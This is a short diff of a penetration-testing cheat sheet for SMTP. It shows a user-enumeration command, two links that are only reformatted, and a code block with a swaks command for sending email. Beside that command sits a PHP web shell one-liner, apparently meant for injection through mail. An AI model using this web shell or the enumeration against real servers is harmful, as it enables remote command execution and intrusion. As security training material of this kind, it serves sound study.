@@ -20,13 +20,13 @@ smtp-user-enum [flag]-U <user-list> -t <IP/Domain>
 
 ## Cheatsheet for commands:
 
-[https://www.samlogic.net/articles/smtp-commands-reference.htm](https://www.samlogic.net/articles/smtp-commands-reference.htm)
+[samlogic.net/smtp-commands-reference.htm](https://www.samlogic.net/articles/smtp-commands-reference.htm)
 
 ## Swiss Army Knife for SMTP
 
-[https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
+* [jetmore/swaks](https://github.com/jetmore/swaks)
 
-```
+```bash
 # send auto email
 $ swaks --to EMAIL --from kashz --header "Subject: kashz" --body "SHELL or LINK?" --server IP
 <?php system($_REQUEST["cmd"]); ?>
